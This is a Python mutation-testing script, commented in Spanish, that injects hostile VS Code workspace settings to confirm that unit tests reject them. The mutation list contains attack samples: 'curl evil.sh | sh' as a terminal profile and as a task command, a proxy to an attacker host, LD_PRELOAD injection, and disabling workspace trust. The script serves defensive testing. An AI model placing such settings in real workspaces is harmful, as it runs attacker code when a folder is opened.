#!/usr/bin/env python3
"""Verificacion por mutacion de la defensa de `.vscode/`.

Por que existe
--------------

Versionar un `.vscode/` es una decision con un riesgo que no se ve en el codigo:
un `settings.json` versionado se carga al abrir la carpeta y VS Code le cree
**sin preguntar**, y hay claves que ejecutan codigo o desvian datos
(`terminal.integrated.profiles`, `python.analysis.extraPaths`, `http.proxy`,
`security.workspace.trust.enabled`). Son declaraciones, no scripts, asi que un
review se las pasa por alto.

La defensa son `tests/unit/test_vscode_settings.py`. Este script comprueba que esa
defensa **muerde**: aplica cada ataque a los archivos, corre los tests, y restaura.
Un test que pasa con y sin la defensa no demuestra nada; el valor esta en que
muera.

Uso:
    python3 scripts/verify_vscode_mutations.py

Debe terminar con "Las N mutaciones mueren". Si alguna sobrevive, el `.vscode/`
esta defendiendo menos de lo que parece.
"""

from __future__ import annotations

import re
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

RAIZ = Path(__file__).resolve().parents[1]
VSC = RAIZ / ".vscode" / "settings.json"
TASKS = RAIZ / ".vscode" / "tasks.json"
GITIGNORE = RAIZ / ".gitignore"
TEST = "tests/unit/test_vscode_settings.py"


def _correr_tests() -> bool:
    """True si los tests pasan (es decir, si la defensa NO esta presente)."""
    r = subprocess.run(
        [sys.executable, "-m", "pytest", TEST, "-q", "--no-header", "-x"],
        cwd=RAIZ, capture_output=True, text=True,
    )
    return r.returncode == 0


def _añadir_clave(clave: str, valor: str) -> None:
    """Inserta una clave raiz antes de `files.exclude`."""
    t = VSC.read_text(encoding="utf-8")
    nuevo = t.replace('"files.exclude"', f'{clave}: {valor},\n  "files.exclude"', 1)
    if nuevo == t:
        raise SystemExit(f"no se pudo insertar {clave}: el ancla no existe")
    VSC.write_text(nuevo, encoding="utf-8")


def _silenciar(regla: str, con_comentario: bool) -> None:
    """Anade una regla silenciada, con o sin justificacion."""
    t = VSC.read_text(encoding="utf-8")
    cola = f"    // justificacion inventada\n" if con_comentario else ""
    nuevo = t.replace(
        '"reportArgumentType": "none"',
        f'"reportArgumentType": "none",\n{cola}    "{regla}": "none"',
        1,
    )
    if nuevo == t:
        raise SystemExit(f"no se pudo silenciar {regla}")
    VSC.write_text(nuevo, encoding="utf-8")


def _ampliar_lista_blanca(regla: str) -> None:
    """Deja pasar `regla` por la lista blanca, para aislar un solo defence."""
    t = Path(RAIZ / TEST).read_text(encoding="utf-8")
    nuevo = t.replace(
        'permitidas = {"reportMissingImports", "reportArgumentType"}',
        f'permitidas = {{"reportMissingImports", "reportArgumentType", "{regla}"}}',
    )
    if nuevo == t:
        raise SystemExit("no se pudo ampliar la lista blanca")
    Path(RAIZ / TEST).write_text(nuevo, encoding="utf-8")


MUTACIONES = [
    (
        "terminal.integrated.profiles",
        "redefinir la terminal para ejecutar un comando al abrir la carpeta",
        lambda: _añadir_clave(
            '"terminal.integrated.profiles"',
            '{"Linux": "sh -c \\"curl evil.sh | sh\\""}',
        ),
        False,
    ),
    (
        "python.analysis.extraPaths",
        "secuestrar la resolucion de un modulo",
        lambda: _añadir_clave('"python.analysis.extraPaths"', '["/tmp/atacante"]'),
        False,
    ),
    (
        "python.pythonPath",
        "hacer que el editor ejecute otro interprete",
        lambda: _añadir_clave('"python.pythonPath"', '"/tmp/atacante/bin/python"'),
        False,
    ),
    (
        "http.proxy",
        "desviar todo el trafico",
        lambda: _añadir_clave('"http.proxy"', '"http://atacante:8080"'),
        False,
    ),
    (
        "security.workspace.trust.enabled",
        "apagar la pregunta de confianza del workspace",
        lambda: _añadir_clave('"security.workspace.trust.enabled"', "false"),
        False,
    ),
    (
        "terminal.integrated.env.LD_PRELOAD",
        "inyectar una biblioteca en cada terminal que se abre",
        lambda: _añadir_clave(
            '"terminal.integrated.env.LD_PRELOAD"', '"/tmp/malo.so"'
        ),
        False,
    ),
    (
        "reportUndefinedVariable silenciada",
        "apagar la regla que encontro el SourceType.AUTO y el select sin importar",
        lambda: _silenciar("reportUndefinedVariable", con_comentario=True),
        False,
    ),
    (
        "reportAttributeAccessIssue silenciada",
        "apagar la segunda regla que encontro codigo muerto",
        lambda: _silenciar("reportAttributeAccessIssue", con_comentario=True),
        False,
    ),
    (
        "tercera regla silenciada sin medir",
        "acumular silencios 'temporales' que nunca se quitan",
        lambda: _silenciar("reportOptionalSubscript", con_comentario=True),
        False,
    ),
    (
        "regla silenciada sin comentario",
        "callar una regla sin escribir por que",
        lambda: _silenciar("reportOptionalSubscript", con_comentario=False),
        True,
    ),
    (
        "settings.json sin exencion en .gitignore",
        "dejar de versionar la politica de silencios",
        lambda: GITIGNORE.write_text(
            GITIGNORE.read_text(encoding="utf-8").replace(
                "!.vscode/settings.json\n", ""
            ),
            encoding="utf-8",
        ),
        False,
    ),
    (
        "launch.json exento",
        "anadir una superficie de confianza nueva por un git add .",
        lambda: GITIGNORE.write_text(
            GITIGNORE.read_text(encoding="utf-8") + "!.vscode/launch.json\n",
            encoding="utf-8",
        ),
        False,
    ),
    (
        "carpeta .vscode abierta entera",
        "dejar que cualquier archivo del editor acabe en un git add .",
        lambda: GITIGNORE.write_text(
            GITIGNORE.read_text(encoding="utf-8").replace(
                ".vscode/*\n!.vscode/settings.json\n!.vscode/tasks.json\n", ""
            ),
            encoding="utf-8",
        ),
        False,
    ),
    (
        "tasks.json deja de exentarse",
        "las tareas de make se quedan fuera del repo sin avisar",
        lambda: GITIGNORE.write_text(
            GITIGNORE.read_text(encoding="utf-8").replace(
                "!.vscode/tasks.json\n", ""
            ),
            encoding="utf-8",
        ),
        False,
    ),
    (
        "tarea con comando arbitrario",
        "ejecutar lo que sea con un Ctrl+Shift+B",
        lambda: TASKS.write_text(
            TASKS.read_text(encoding="utf-8").replace(
                '"command": "make up"',
                '"command": "curl evil.sh | sh",\n      "label2": "make up"',
                1,
            ),
            encoding="utf-8",
        ),
        False,
    ),
    (
        "tarea que interpola input",
        "que el comando dependa de quien lo pulse",
        lambda: TASKS.write_text(
            TASKS.read_text(encoding="utf-8").replace(
                '"command": "make up"',
                '"command": "make up ${input:ruta}",\n      "label2": "x"',
                1,
            ),
            encoding="utf-8",
        ),
        False,
    ),
    (
        "settings.json borrado",
        "que la politica de silencios se pierda en silencio",
        lambda: VSC.unlink(),
        False,
    ),
    (
        "JSONC invalido",
        "un error de sintaxis hace que VS Code ignore el archivo entero, callado",
        lambda: VSC.write_text("{ esto no es json", encoding="utf-8"),
        False,
    ),
]


def main() -> int:
    # Linea base: si aqui los tests ya fallan, las mutaciones no significan nada.
    if not _correr_tests():
        print("La linea base ya esta en rojo. Arregla eso antes de medir nada.")
        return 1

    with tempfile.TemporaryDirectory() as tmp:
        copia = Path(tmp)
        # El test se copia con su ruta relativa porque `_ampliar_lista_blanca`
        # lo restaura usando la misma ruta dentro del repo.
        (copia / TEST).parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(VSC, copia / "settings.json")
        shutil.copy2(TASKS, copia / "tasks.json")
        shutil.copy2(GITIGNORE, copia / "gitignore")
        shutil.copy2(RAIZ / TEST, copia / TEST)

        sobrevividas: list[str] = []
        for nombre, porque, aplicar, muta_test in MUTACIONES:
            try:
                aplicar()
                if muta_test:
                    _ampliar_lista_blanca("reportOptionalSubscript")
            except SystemExit as e:
                print(f"  ERROR    {nombre}: {e}")
                sobrevividas.append(nombre)
                continue

            if _correr_tests():
                sobrevividas.append(nombre)
                print(f"  VIVA     {nombre}")
                print(f"           {porque}")
            else:
                print(f"  murio    {nombre}")

            # Restauracion. El orden importa: si se muto el test, primero el
            # test, porque la restauracion de los .vscode no lo toca.
            shutil.copy2(copia / TEST, RAIZ / TEST)
            shutil.copy2(copia / "settings.json", VSC)
            shutil.copy2(copia / "tasks.json", TASKS)
            shutil.copy2(copia / "gitignore", GITIGNORE)

    print()
    if sobrevividas:
        print(f"{len(sobrevividas)} de {len(MUTACIONES)} mutaciones SOBREVIVIERON:")
        for s in sobrevividas:
            print(f"  - {s}")
        print()
        print("Una defensa que no muere cuando se rompe no es una defensa.")
        return 1

    print(f"Las {len(MUTACIONES)} mutaciones mueren. El .vscode/ esta defendiendo "
          f"lo que dice que defiende.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
